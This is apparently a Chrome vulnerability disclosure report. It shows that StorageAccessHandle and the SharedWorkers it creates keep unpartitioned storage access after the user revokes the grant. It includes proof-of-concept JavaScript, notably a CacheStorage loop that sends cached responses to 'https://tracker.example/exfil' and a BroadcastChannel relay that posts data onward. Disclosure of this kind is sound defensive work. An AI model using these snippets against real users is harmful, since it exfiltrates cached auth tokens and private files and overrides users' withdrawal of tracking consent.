# Chrome VRP Report: StorageAccessHandle Retains Unpartitioned Access After Grant Revocation

## Summary

Chrome's `StorageAccessHandle` (the browser-side Mojo service backing `document.requestStorageAccess({...})`) checks the SAA grant exactly ONCE at creation time. After binding, the handle provides permanent unpartitioned access to IndexedDB, CacheStorage, Web Locks, OPFS, BroadcastChannel, and SharedWorker for the lifetime of the document — regardless of whether the underlying permission grant is revoked. Additionally, SharedWorkers created via the handle operate with unpartitioned StorageKeys and persist beyond the creating document, allowing other same-origin iframes to indirectly access unpartitioned storage through the worker even without their own SAA grant.

## Severity Assessment

- **Type**: Authorization bypass / Permission persistence after revocation
- **User Interaction**: User must initially grant SAA permission (one click)
- **Preconditions**: Third-party iframe with SAA grant; user later revokes grant
- **Chrome Version**: All versions with Storage Access API handle types (Chrome 117+)
- **Flags Required**: None (default configuration)
- **Compromised Renderer**: Not required
- **Platform**: All platforms

## Reproduction Steps

### Part 1: StorageAccessHandle persists after grant revocation

**Setup:**
- Site A (`https://embedder.example`) embeds an iframe from Site B (`https://tracker.example`)
- Site B's iframe has previously been granted Storage Access

**Steps:**

1. Site B's iframe calls:
```javascript
const handle = await document.requestStorageAccess({
  indexedDB: true,
  caches: true,
  locks: true,
  getDirectory: true
});
```

2. The SAA prompt is shown, user grants access. `StorageAccessHandle` is created in the browser process.

3. Site B's iframe uses the handle to write data to unpartitioned IndexedDB:
```javascript
const db = await handle.indexedDB.open('shared_data', 1);
// Write data accessible to first-party tracker.example
```

4. User navigates to `chrome://settings/content/storageAccess` and revokes the grant for tracker.example on embedder.example. Or: user clears site data for tracker.example.

5. Back in the original tab, Site B's iframe STILL has a working `handle.indexedDB`:
```javascript
// This still works! The handle was bound before revocation.
const db = await handle.indexedDB.open('shared_data', 1);
const tx = db.transaction('store', 'readwrite');
// Can still read/write to the unpartitioned IndexedDB
```

**Expected**: After grant revocation, the StorageAccessHandle should become non-functional. Operations on `handle.indexedDB`, `handle.caches`, etc. should fail.

**Actual**: The handle continues to provide full unpartitioned access for the document's remaining lifetime.

### Part 2: SharedWorker outlives the SAA grant

1. Site B's iframe creates a SharedWorker via the StorageAccessHandle:
```javascript
const handle = await document.requestStorageAccess({ sharedWorker: true });
// SharedWorker gets first-party StorageKey
const worker = new SharedWorker('worker.js', { name: 'shared', via: handle });
```

2. The SharedWorker is now running with `StorageKey::CreateFirstParty(tracker.example)` and `StorageAccessApiStatus::kAccessViaAPI`.

3. User revokes the SAA grant.

4. Site B's iframe navigates away or is removed from the DOM.

5. **Another** same-origin iframe from Site B on the same page (or a different page on embedder.example) connects to the existing SharedWorker by name:
```javascript
// This iframe does NOT have an SAA grant
const worker = new SharedWorker('worker.js', { name: 'shared' });
// Connected to the same worker operating with unpartitioned access!
worker.port.onmessage = (e) => {
  // Receives data from unpartitioned IndexedDB via the worker
};
worker.port.postMessage({ action: 'read_unpartitioned_idb' });
```

**Expected**: The SharedWorker should lose its unpartitioned access when the SAA grant that created it is revoked.

**Actual**: The SharedWorker continues operating with `StorageKey::CreateFirstParty()` indefinitely, and other iframes can connect to it and benefit from its unpartitioned access without ever having their own SAA grant.

## Technical Root Cause

### 1. One-time check at `StorageAccessHandle::Create()`

**`content/browser/storage_access/storage_access_handle.cc:51-63`**:
```cpp
void StorageAccessHandle::Create(
    RenderFrameHost* host,
    mojo::PendingReceiver<blink::mojom::StorageAccessHandle> receiver) {
  CHECK(host);
  if (!host->IsFullCookieAccessAllowed()) {
#if DCHECK_IS_ON()
    mojo::ReportBadMessage("...");
#endif
    return;
  }
  // No ongoing permission subscription — permission is checked exactly once
  new StorageAccessHandle(*host, std::move(receiver));
}
```

### 2. Direct binding to first-party StorageKeys

All `Bind*` methods use `StorageKey::CreateFirstParty(origin)` without any ongoing permission check:
```cpp
void StorageAccessHandle::BindIndexedDB(...) {
  render_frame_host().GetProcess()->BindIndexedDB(
      blink::StorageKey::CreateFirstParty(
          render_frame_host().GetStorageKey().origin()),  // First-party key!
      ..., std::move(receiver));
}
```

### 3. SharedWorker persistence with override

**`content/browser/storage_access/storage_access_handle.cc:214-221`**:
```cpp
void StorageAccessHandle::BindSharedWorker(...) {
  SharedWorkerConnectorImpl::Create(
      PassKey(), render_frame_host().GetGlobalId(),
      blink::StorageKey::CreateFirstParty(
          render_frame_host().GetStorageKey().origin()),  // First-party key override!
      std::move(receiver));
}
```

The SharedWorker service uses this as `storage_key_override` which persists for the worker's lifetime.

## Impact

### 1. Grant Revocation Ineffective
Users who revoke SAA grants through settings expect the third-party to immediately lose unpartitioned access. In practice, access persists for the remaining document lifetime (which can be hours for long-lived web apps like Gmail, Office 365).

### 2. SharedWorker as Persistence Mechanism
A third-party can use SharedWorker via StorageAccessHandle as a persistence mechanism — once created, the worker maintains unpartitioned access indefinitely regardless of permission state, and serves as a conduit for other iframes that never received their own SAA grant.

### 3. BroadcastChannel as Real-Time Cross-Tab Communication Channel
BroadcastChannel created via StorageAccessHandle uses `StorageKey::CreateFirstParty(origin)`, which is identical to the key used by the first-party top-level instance of the same origin. The `BroadcastChannelService` routes messages by `(StorageKey, channel_name)` pairs. This means:

- Third-party iframe (with SAA grant) on `embedder.example` creates BroadcastChannel "sync" via SAH
- First-party `tracker.example` in another tab creates BroadcastChannel "sync"  
- Both have identical StorageKeys → messages flow between them in real-time

This exceeds SAA's design intent — SAA grants access to *storage*, not a real-time bidirectional messaging primitive. Without SAA, the iframe's BroadcastChannel would use a partitioned key that does NOT match the first-party instance.

```javascript
// In third-party iframe on embedder.example (with SAA grant):
const handle = await document.requestStorageAccess({
  broadcastChannel: true
});
// This channel talks to tracker.example's first-party tabs!
const bc = new BroadcastChannel('exfil');
bc.postMessage({browsing_context: location.href, user_activity: '...'});

// In first-party tracker.example (different tab):
const bc = new BroadcastChannel('exfil');
bc.onmessage = (e) => {
  // Receives real-time updates from embedded iframe!
  fetch('/track', {method: 'POST', body: JSON.stringify(e.data)});
};
```

### 4. CacheStorage Read/Write Access to First-Party Service Worker Caches
CacheStorage bound via StorageAccessHandle (`storage_access_handle.cc:82-105`) uses `StorageKey::CreateFirstParty(origin)` with a `ForDefaultBucket` locator. This is the SAME CacheStorage used by the origin's service worker. The iframe can:

- **List** all named caches (`caches.keys()`)
- **Open and read** any cache entry (potentially containing API responses with auth tokens, user data)
- **Write** entries that the service worker will serve to the first-party site
- **Delete** cache entries, breaking the first-party site's offline functionality

```javascript
const handle = await document.requestStorageAccess({ caches: true });
// Read the first-party site's SW cache!
const cache = await handle.caches.open('api-responses-v1');
const entries = await cache.keys();
for (const req of entries) {
  const resp = await cache.match(req);
  // Exfiltrate cached API responses (may contain auth tokens, user data)
  const data = await resp.text();
  navigator.sendBeacon('https://tracker.example/exfil', data);
}
```

### 5. OPFS (Origin Private File System) Full Read/Write Access
The `GetDirectory()` binding (`storage_access_handle.cc:107-119`) provides access to the first-party site's OPFS via `StorageKey::CreateFirstParty(origin)`. This gives the iframe full read/write access to any files the first-party site has stored in its private filesystem — potentially including:
- User documents (if the site uses OPFS for document storage)
- Database files (e.g., SQLite WASM databases stored in OPFS)
- Application state

```javascript
const handle = await document.requestStorageAccess({ getDirectory: true });
const root = await handle.getDirectory();
// Enumerate all files in the first-party OPFS
for await (const [name, entry] of root.entries()) {
  if (entry.kind === 'file') {
    const file = await entry.getFile();
    const content = await file.text();
    // Read first-party's private files!
  }
}
```

### 6. Web Locks Cross-Origin Interference
The Lock Manager binding (`storage_access_handle.cc:74-80`) uses `StorageKey::CreateFirstParty(origin)`, placing locks in the same namespace as the first-party site. This enables:

- **Denial of Service**: Acquire exclusive locks that block the first-party site's operations
- **Information Oracle**: Use `locks.query()` to enumerate which locks the first-party currently holds, revealing internal application state and user activity

```javascript
const handle = await document.requestStorageAccess({ locks: true });
// See what locks the first-party site is holding
const state = await handle.locks.query();
// state.held reveals what operations the first-party is currently performing
// (e.g., "idb-write", "sync-in-progress", etc.)
```

### 7. Storage Quota Fingerprinting
The `Estimate()` binding (`storage_access_handle.cc:121-162`) returns the first-party site's storage usage and quota via `StorageKey::CreateFirstParty`. This reveals:
- How much data the first-party site stores (correlation with user activity level)
- Total quota allocation (may reveal browser profile characteristics)

### 8. BFCache Amplification
Pages with SAA grants are explicitly allowed into BFCache (`kRequestedStorageAccessGrant` in `GetAllowedWebSchedulerTrackedFeatures()`). A BFCache'd page with bound `StorageAccessHandle` services retains unpartitioned access through cache/restore without re-validation.

## Suggested Fix

1. **Subscribe to permission changes**: `StorageAccessHandle` should subscribe to `STORAGE_ACCESS` content setting changes via `content_settings::Observer`. When the relevant grant is revoked, all bound Mojo receivers should be reset/disconnected.

2. **SharedWorker grant validation**: SharedWorkers created via `StorageAccessHandle` should periodically re-validate the SAA grant, or should be terminated when the creating document's grant is revoked.

3. **BFCache eviction on grant change**: Pages with active `StorageAccessHandle` bindings should be evicted from BFCache when the underlying content setting changes.

## References

- `content/browser/storage_access/storage_access_handle.cc:51-221` (all bindings)
- `content/browser/storage_access/storage_access_handle.cc:74-80` (Lock Manager with first-party key)
- `content/browser/storage_access/storage_access_handle.cc:82-105` (CacheStorage with first-party key)
- `content/browser/storage_access/storage_access_handle.cc:107-119` (OPFS GetDirectory with first-party key)
- `content/browser/storage_access/storage_access_handle.cc:121-162` (Estimate with first-party key)
- `content/browser/storage_access/storage_access_handle.cc:164-193` (BlobURLStore with first-party key)
- `content/browser/storage_access/storage_access_handle.cc:195-210` (BroadcastChannel with first-party key)
- `content/browser/storage_access/storage_access_handle.cc:214-221` (SharedWorker with first-party key)
- `content/browser/worker_host/shared_worker_service_impl.cc:162-166`
- `content/browser/broadcast_channel/broadcast_channel_service.cc:88-98` (message routing by StorageKey)
- `content/browser/broadcast_channel/broadcast_channel_service.h:60` (connections multimap keyed on `pair<StorageKey, string>`)
- `content/browser/renderer_host/back_forward_cache_impl.cc:242` (`kRequestedStorageAccessGrant`)
- Storage Access API specification: https://privacycg.github.io/storage-access/
